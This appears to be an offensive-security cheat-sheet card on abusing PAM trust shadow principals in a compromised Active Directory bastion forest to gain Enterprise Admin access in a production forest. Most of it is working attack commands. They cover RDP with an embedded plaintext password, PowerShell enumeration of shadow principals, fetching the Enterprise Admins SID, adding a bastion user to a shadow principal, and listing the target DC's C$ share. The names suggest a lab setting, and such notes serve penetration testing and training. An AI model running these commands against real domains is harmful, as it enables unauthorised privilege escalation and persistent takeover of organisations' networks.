# 14.01 Abusing PAM Trusts Shadow Principals

> Hijack PAM Shadow Principals in a Bastion Forest to map to privileged production-forest SIDs without touching production credentials.

## Overview

Privileged Access Management (PAM) trusts use a Bastion Forest to manage production forests. Shadow Principals in the bastion forest map to SIDs of privileged groups in the user forest. If the bastion forest is compromised, enumerate shadow principals and either leverage existing ones for instant admin access to production forests, or create new ones. No current card exists for this topic.

## Steps

- RDP into compromised bastion forest DC
- **Get-ADObject -SearchBase "CN=Shadow Principal Configuration..."** — enumerate shadow principals and their mapped SIDs
- Check msDS-ShadowPrincipalSid to identify which privileged group in the user forest is mapped
- If shadow principal member includes Administrator of bastion, directly access user forest via UNC path or PSSession
- If no shadow principals exist, create one: get Enterprise Admins SID from user forest, **New-ADObject -Type msDS-ShadowPrincipal**, then **Set-ADObject** to add a bastion user as member

## Commands

### RDP into bastion DC

```bash
xfreerdp /u:Administrator /p:'C0ntrol_center_adm!' /v:<TARGET> /dynamic-resolution
```

### Enumerate shadow principals

```powershell
PS C:\Tools> Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
```

### Create shadow principal (if none exist)

```powershell
$ShadowPrincipalSid = (Get-ADGroup -Identity 'Enterprise Admins' -Properties ObjectSID -Server eulogistics.corp).ObjectSID
```

### Add bastion admin to shadow principal

```powershell
Set-ADObject -Identity "CN=Tom,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=controlcenter,DC=corp" -Add @{'member'="CN=Administrator,CN=Users,DC=controlcenter,DC=corp"} -Verbose
```

### Access user forest as admin

```powershell
PS C:\Tools> ls \\DC-EU.eulogistics.corp\c$
```
